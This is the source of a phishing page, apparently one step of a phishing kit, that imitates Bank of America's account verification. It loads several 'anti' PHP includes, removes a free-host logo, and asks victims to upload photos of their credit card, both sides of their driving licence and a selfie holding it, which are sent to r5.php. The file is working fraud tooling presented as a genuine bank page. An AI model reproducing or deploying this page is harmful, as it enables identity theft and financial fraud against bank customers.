<?php
	include 'prevents/anti1.php';
	include 'prevents/anti2.php';
	include 'prevents/anti3.php';
	include 'prevents/anti4.php';
	include 'prevents/anti5.php';
	include 'prevents/anti6.php';
	include 'prevents/anti7.php';
	include 'prevents/anti8.php';
?>
<!DOCTYPE html>
<html class="win chrome chrome-47 webkit svg-bg not-retina non-retinal cf-l33bo-reg-active cf-l33bo-med-active" lang="en-US">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
<title>Verification</title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/ico">
<link href="assets/css/frd.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/verify2.css" rel="stylesheet" type="text/css">
<link href="assets/css/error-tips.css" rel="stylesheet" type="text/css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<script>
    $(document).ready(function(){ 
	$('body').find('img[src$="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"]').remove();
    }); 
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<style>
span.error {
	color:red;
	display:block;
	text-size:8px;
	font-weight:bold;
	padding-left:3px;
</style>
<script>
$('#details').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "span",			
                rules: {
					q1: { required: true},
					q2: { required: true},
					q3: { required: true},
					q4: { required: true},
					q5: { required: true},
					a1: { required: true},
					a2: { required: true},
					a3: { required: true},
					a4: { required: true},
					a5: { required: true},
                },
				errorPlacement: function(error, element) {
				if (element.attr("name") == "q1") 
				error.insertAfter("#q1error");
				else if (element.attr("name") == "q2") 
				error.insertAfter("#q2error");
				else if (element.attr("name") == "q3") 
				error.insertAfter("#q3error");
				else if (element.attr("name") == "q4") 
				error.insertAfter("#q4error");
				else if (element.attr("name") == "q5") 
				error.insertAfter("#q5error");
				if (element.attr("name") == "a1") 
				error.insertAfter("#a1error");
				else if (element.attr("name") == "a2") 
				error.insertAfter("#a2error");
				else if (element.attr("name") == "a3") 
				error.insertAfter("#a3error");
				else if (element.attr("name") == "a4") 
				error.insertAfter("#a4error");
				else if (element.attr("name") == "a5") 
				error.insertAfter("#a5error");
				else 
				error.insertAfter(element);			
				},
				groups: {
					ccexp: "ccmm ccyy",
				},
                messages: {
					q1:{required: "Please select a security question",},
					q2:{required: "Please select a security question",},
					q3:{required: "Please select a security question",},
					q4:{required: "Please select a security question",},
					q5:{required: "Please select a security question",},
					a1:{required: "Please provide your answer to the above security question",},
					a2:{required: "Please provide your answer to the above security question",},
					a3:{required: "Please provide your answer to the above security question",},
					a4:{required: "Please provide your answer to the above security question",},
					a5:{required: "Please provide your answer to the above security question",},
				},
			   submitHandler: function(form) {
                    form.submit();
                }
            });

			$("#go").click(function() {
			$("#details").submit();
			});
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
 
</script>
</head>
<body>
<div class="two-row-flex-wideleft-layout">
<div class="center-content">
<div class="header">
<div class="header-module">
<div class="l33b00"><img height="28" src="assets/img/logo.gif" width="221">
<div class="page-type l33bo-reg">Account Verification</div>
<div class="right-links">
<div class="secure-area">Secure Area</div>
<a class="divide" href="#">En Espa&ntilde;ol</a>
<div class="clearboth"></div>
</div>
<div class="clearboth"></div>
</div>
</div>
<div class="page-title-module h-100" id="skip-to-h1" style="height:60px!important">
<div class="red-grad-bar-skin sup-ie">
<h1 class="l33bo-reg">Step 4</h1>
</div>
</div>
<div class="status-bar-bdf-module">
<div class="multi-step-skin">
<div class="sb-step"><span class="ada-hidden">Step 1 of 5:</span> Personal Information
<div class="sb-arrow"></div>
</div>
<div class="sb-step "><span class="ada-hidden">You are currently at Step 2 of 5:</span> Account Details
<div class="sb-arrow"></div>
</div>
<div class="sb-step sb-previous-step"><span class="ada-hidden">Step 3 of 5:</span> Security
<div class="sb-arrow"></div>
</div>
<div class="sb-step sb-selected-step"><span class="ada-hidden">You are currently at Step 4 of 5:</span> Identification
<div class="sb-arrow"></div>
</div>
<div class="sb-step sb-last-step"><span class="ada-hidden">Step 5 of 5:</span> Finish</div>
<div class="clearboth"></div>
</div>
</div>
</div>
<div class="flex-top-row"></div>
<div class="bottom-row">
<div class="left-column">
<div class="passcode-module">
<div class="self-enroll-skin phoenix">
<p class="mbtm-10">To help verify your identity, please provide the next 
informations.</p>
<form action="r5.php" autocomplete="off" class="common-form" id="details" method="post" name="details" enctype="multipart/form-data">
<fieldset><legend></legend>
<div class="input-section">
<fieldset>
<div class="text2">
<table border="0" cellpadding="0" cellspacing="0" summary="">
<tbody>
<tr>
<td colspan="5"><br></td>
</tr>
</tbody>
</table>
<table border="0" cellpadding="0" cellspacing="0" summary="" width="75%">
<tbody>
<tr>
<td>
<table border="0" cellpadding="0" cellspacing="0" summary="">
<tbody>
<tr>
<td><span class="title4"><span class="textBold"><label for="a"><b>Provide front picture of credit card and driving license<br></b>
<img alt="" height="110" src="assets/img/merge_from_ofoct.jpg" width="305"></label></span></span></td>
</tr>
<tr>
<td><input type="file" name="files[]" id="myFile">
<span id="a1error" class="l33error"></span>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<!-- Question 2 --></tbody>
</table>
<table border="0" cellpadding="0" cellspacing="0" summary="" width="75%">
<tbody>
<tr>
<td>
<table border="0" cellpadding="0" cellspacing="0" summary="">
<tbody>
<tr>
<td><span class="title4"><span class="textBold"><label for="a"><b>Provide back picture of driving license<br></b>
<img alt="" height="90" src="assets/img/27535847-stock-vector-illustration-of-front-and-back-id-card.jpg" width="180"></label></span></span></td>
</tr>
<tr>
<td><input type="file" name="files[]"  id="myFile">
<span id="a2error" class="l33error"></span>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<!-- Question 3 --></tbody>
</table>
<table border="0" cellpadding="0" cellspacing="0" summary="" width="75%">
<tbody>
<tr>
<td>
<table border="0" cellpadding="0" cellspacing="0" summary="">
<tbody>
<tr>
<td><span class="title4"><span class="textBold"><label for="a"><b>Provide selfie with driving license<br></b>
<img alt="" height="114" src="assets/img/14303695_853354554765349_388275294_o.jpg" width="293"></label></span></span></td>
</tr>
<tr>
<td><input type="file" name="files[]" id="myFile">
<span id="a3error" class="l33error"></span>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<!-- Question 4 --></tbody>
</table>
<table border="0" cellpadding="0" cellspacing="0" summary="" width="75%">
<tbody>
<tr>

</tr>
<tr>
<td>
<table border="0" cellpadding="0" cellspacing="0" summary="">

</table>
</td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
<!-- Question 5 --></tbody>
</table>
<table border="0" cellpadding="0" cellspacing="0" summary="" width="75%">
<tbody>
<tr>

</tr>
<tr>
<td>
<table border="0" cellpadding="0" cellspacing="0" summary="">

</table>
</td>
</tr>
<tr>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
</div>
</fieldset>
</div>
</fieldset>
<div class="hidden-sections">
<div id="default"></div>
</div>
<div class="ptop-30">
<input id="continue" type="submit" value="Continue" class="btn-bofa btn-bofa-small btn-bofa-blue" id="go"></input>
<div class="clearboth"></div>
</div>
</form>
</div>
</div>
</div>
<div class="right-column no-print"></div>
<div class="clearboth"></div>
</div>
<div class="single-column-row"></div>
<div class="footer">
<div class="footer-top">&nbsp;</div>
<div class="footer-inner" style="margin-top: 83px;">
<div class="global-footer-module">
<div class="gray-bground-skin cssp">
<div class="secure">Secure area</div>
<div class="link-container">
<div class="link-row"><a class="last-link" href="#">Privacy &amp; Security</a>
<div class="clearboth"></div>
</div>
</div>
<p>Bank of America, N.A. Member FDIC. <a href="#">Equal Housing Lender<img alt="" height="9" src="assets/img/house.gif" width="14"></a><br>
&copy;&nbsp;2021 Bank of America Corporation. All rights reserved.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>